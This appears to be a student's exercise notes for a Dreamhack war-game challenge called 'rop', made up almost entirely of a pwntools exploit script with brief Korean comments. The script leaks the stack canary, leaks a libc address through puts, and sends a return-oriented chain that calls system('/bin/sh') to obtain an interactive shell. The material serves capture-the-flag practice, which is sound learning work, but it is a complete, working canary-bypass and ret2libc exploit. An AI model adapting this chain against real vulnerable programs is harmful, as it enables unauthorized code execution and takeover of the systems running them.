#### Week3

### [War Game] [rop]  

from pwn import *

#p = remote("host8.dreamhack.games", 19077)
p = process('./rop', env = {'LD_PRELOAD' : './libc.so.6'})
elf = ELF('./rop')
libc = ELF('./libc.so.6')

pop_rdi_ret = 0x400853
ret = 0x400596

### Canary leak
p.send(b'a' * 56 + b'q' )
p.recvuntil(b'q')
canary = u64(b'\x00' + p.recv(7))
print(hex(canary))


### Libc address leak

## read주소 leak
payload = b'a' * 56
payload += p64(canary)
payload += b'a' * 8
payload += p64(pop_rdi_ret) + p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main']) ## main말고 다른 곳 갈려고 했는데 계속 터져서 걍 main 할란다

p.sendafter(b'Buf: ', payload)

## libc주소 leak
read_addr = u64(p.recv(6).ljust(8, b"\x00"))  ## 출력주소 숫자로 바꾸고
libc.address = read_addr - libc.symbols['read'] ## libc 시작주소

## 셸 leak

p.sendafter(b'Buf: ', b"aaaaa")

final_payload = b'a' * 56
final_payload += p64(canary)
final_payload += b'a' * 8
final_payload += p64(ret)
final_payload += p64(pop_rdi_ret)
final_payload += p64(next(libc.search(b'/bin/sh')))
final_payload += p64(libc.symbols['system'])

p.sendafter(b'Buf: ', final_payload)


p.interactive()


